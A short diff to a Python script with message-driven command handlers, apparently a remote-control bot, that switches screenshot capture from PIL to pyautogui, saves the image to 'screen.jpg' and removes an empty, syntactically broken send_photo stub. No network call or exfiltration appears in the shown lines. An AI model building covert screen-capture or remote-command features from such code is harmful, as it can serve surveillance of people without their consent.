@@ -2,7 +2,7 @@ import glob
 import os
 import shutil
 import subprocess
-from PIL import ImageGrab
+import pyautogui
 
 ERR = "error has occurred"
 IMAGE_PLACE = 'image-place.'
@@ -50,7 +50,6 @@ def execute_cmd(msg):
         output = 'file copied successfully'
     except Exception as err:
         output += ' ' + str(err)
-
     finally:
         return output
 
@@ -58,22 +57,11 @@ def execute_cmd(msg):
 def take_screenshot_cmd(msg):
     output = ERR
     try:
-        screenshot = ImageGrab.grab()
-        screenshot.save(filepath, 'PNG')  # Equivalent to `screenshot.save(filepath, format='PNG')`
+        image = pyautogui.screenshot()
+        image.save(r'screen.jpg')
         output = 'screenshot was taken successfully'
     except Exception as err:
         output += ' ' + str(err)
-
     finally:
         return output
 
-
-def send_photo(msg):
-    output = ERR
-    try:
-        
-    except Exception as err:
-        output += ' ' + str(err)
-
-    finally:
-        return output
